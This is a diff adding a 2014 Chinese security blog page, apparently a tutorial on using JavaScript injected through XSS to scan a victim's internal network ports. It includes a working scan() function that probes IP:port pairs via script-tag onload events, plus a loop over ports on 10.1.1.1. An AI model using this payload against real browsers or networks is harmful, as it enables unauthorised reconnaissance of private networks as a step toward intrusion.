@@ -1,0 +1,169 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimun-scale=1.0, maximun-scale=1.0, user-scalable=no">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>Hotes - xss中使用js扫描外|内网端口</title>
+	<meta name="description" content="在xss攻击中，为了更深一步探测信息，可以尝试着获取一下内网IP段，然后进行端口扫描。当然，神马中间人攻击、跳板exp的这里就不说了。">
+	<meta name="keywords" content="xss,javascript扫描端口,xss扫描端口">
+	<link rel="shortcut icon" href="/static/img/icon.png" />
+	<link href="/static/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link rel="stylesheet" type="text/css" href="/static/codemirror-4.7/lib/codemirror.css">
+	<link rel="stylesheet" type="text/css" href="/static/css/custom.css">
+	<script src="/static/js/jquery.min.js"></script>
+	<script type="text/javascript" src="/static/codemirror-4.7/lib/codemirror.js"></script>
+	<script src="/static/bootstrap/js/bootstrap.min.js"></script>
+	<script src="/static/js/custom.js"></script>
+</head>
+<body>
+	<!-- 导航栏 -->
+	<nav class="navbar navbar-default" role="navigation">
+		<div class="container">
+			<div class="navbar-header">
+				<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#hotes-navbar-collapse">
+					<span class="sr-only">切换</span>
+					<span class="icon-bar"></span>
+					<span class="icon-bar"></span>
+					<span class="icon-bar"></span>
+				</button>
+				<a class="navbar-brand" href="/">Hotes</a>
+				<p class="navbar-text hidden-xs">简记，为简单而记！</p>
+			</div>
+			<div class="collapse navbar-collapse" id="hotes-navbar-collapse">
+				<!-- 页面导航栏 -->
+				<ul class="nav navbar-nav pull-right">
+				
+				
+					
+				
+					
+					
+					<li>
+					
+						<a href="/about/"><span class="glyphicon glyphicon-heart"></span> 关于</a>
+					</li>
+					
+				
+					
+				
+					
+				
+					
+				
+					
+					
+					<li>
+					
+						<a href="/guest/"><span class="glyphicon glyphicon-envelope"></span> 留言板</a>
+					</li>
+					
+				
+					
+				
+					
+				
+					
+				
+				</ul>
+			</div>
+		</div>
+	</nav>
+		<!-- 文章内容 -->
+	<div class="container">
+		<!-- 内容 -->
+		<div class="panel panel-default">
+			<div class="panel-heading">
+				<h3 class="panel-title"><span class="glyphicon glyphicon-cloud"></span> xss中使用js扫描外|内网端口</h3>
+			</div>
+			<div class="panel-body">
+				<!-- 简介 -->
+				<blockquote class="text-muted" style="font-size: 14px;">在xss攻击中，为了更深一步探测信息，可以尝试着获取一下内网IP段，然后进行端口扫描。当然，神马中间人攻击、跳板exp的这里就不说了。</blockquote>
+				<!-- 正文 -->
+				<div style="font-size: 14px;" id="content">
+					<h4 id="section">原理</h4>
+<p>因为能允许跨域访问的URL实在太少，所以使用<code>Ajax</code>技术来实现貌似不太可能，还好，有了一个比较好的思路。  <br />
+因为例如<code>img</code>,<code>script</code>等标签都可以进行跨域访问外部资源，所以这就给了我们想象空间。如果我们创建一个<code>script</code>，然后地址为内网的ip+端口，如果加载成功（就算代码执行出错）也会触发<code>onload</code>事件，这时候我们所要达到的目的已经完成了。</p>
+
+<h4 id="section-1">实现</h4>
+<p>先简单贴一些代码：
+<textarea class="code javascript">
+function scan(ip, port){
+	var s = document.createElement(“script”);
+	s.src = “http://” + ip + “:” + port;
+	s.onload = function(){
+		console.log(“[*] IP:%s PORT:%s OPEN!”, ip, port);
+	}
+	document.body.appendChild(s);
+}
+</textarea>
+然后我们使用<code>for</code>循环扫描端口，例如：
+<textarea class="code javascript">
+for (var i = 0; i &lt; 100; i++) {
+	scan(“10.1.1.1”, i);
+};
+</textarea>
+这时候如果对方端口打开，就会触发<code>onload</code>事件了，事件里的功能代码可以随意扩展～</p>
+
+				</div>
+			</div>
+		</div>
+		<!-- 评论吐槽 -->
+		<div class="panel panel-default hidden-xs">
+			<div class="panel-heading">
+				<h3 class="panel-title"><span class="glyphicon glyphicon-asterisk"></span> 评论吐槽</h3>
+			</div>
+			<div class="panel-body">
+				<!-- 多说评论框 start -->
+				<div class="ds-thread" data-thread-key="0" data-title="xss中使用js扫描外|内网端口" data-url="http://ursb.org/hacking/2014/11/12/xss-scanPorts.html"></div>
+				<!-- 多说评论框 end -->
+				<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+				<script type="text/javascript">
+				var duoshuoQuery = {short_name:"h01ger"};
+					(function() {
+						var ds = document.createElement('script');
+						ds.type = 'text/javascript';ds.async = true;
+						ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+						ds.charset = 'UTF-8';
+						(document.getElementsByTagName('head')[0] 
+						 || document.getElementsByTagName('body')[0]).appendChild(ds);
+					})();
+				</script>
+				<!-- 多说公共JS代码 end -->
+			</div>
+		</div>
+	</div>
+	<!-- 底部文件 -->
+	<hr class="divider">
+	<footer>
+		<div class="container">
+			<div class="pull-left">
+				<p class="text-muted">&copy; 2014 Hotes.</p>
+			</div>
+			<div class="pull-right">
+				<a href="/feed.xml" target="_blank" class="text-danger">RSS</a>
+				<span class="text-muted"> | </span>
+				<a href="https://github.com/h01" target="_blank" class="text-success">GitHub</a>
+				<div style="display: none;">
+					<!-- 百度统计 -->
+					<script type="text/javascript">
+						var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+						document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F39aaf5727abfcedefcdeecf3aad6d895' type='text/javascript'%3E%3C/script%3E"));
+					</script>
+				</div>
+			</div>
+		</div>
+	</footer>
+	<!-- 谷歌更新优化 -->
+	<script type="text/javascript">
+		var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+		document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+	</script>
+	<script type="text/javascript">
+		try {
+			var pageTracker = _gat._getTracker("xss,javascript扫描端口,xss扫描端口");
+			pageTracker._trackPageview();
+		} catch(err) {}
+	</script>
+</body>
+</html>
